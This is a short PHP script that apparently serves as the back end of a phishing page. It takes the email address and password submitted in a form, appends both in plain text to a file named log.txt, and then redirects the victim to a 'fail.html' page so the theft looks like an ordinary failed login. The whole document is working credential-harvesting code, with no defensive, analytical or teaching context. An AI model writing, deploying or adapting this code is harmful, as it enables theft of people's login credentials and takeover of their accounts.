<?php
$email=$_POST["email"];
$pass=$_POST["pass"];
$log=$email." - ".$pass."\n";
file_put_contents("log.txt", $log, FILE_APPEND);
http_response_code(200);
header('Location: fail.html');
?>